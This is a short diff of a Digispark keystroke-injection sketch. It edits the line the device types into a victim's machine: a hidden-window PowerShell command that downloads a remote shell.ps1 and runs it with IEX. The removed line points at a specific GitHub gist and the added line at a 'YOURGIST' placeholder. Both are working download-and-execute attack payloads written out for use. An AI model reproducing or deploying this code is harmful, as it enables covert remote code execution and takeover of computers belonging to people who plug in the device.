@@ -48,7 +48,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/EndlssNightmare/8e73f5ad18de63a997c15b8cff2c95e5/raw/c7981969c4281d8fa348d83d7f1bc504f2554599/shell.ps1');\"");
+  DigiKeyboard.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://YOURGIST/shell.ps1');\"");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
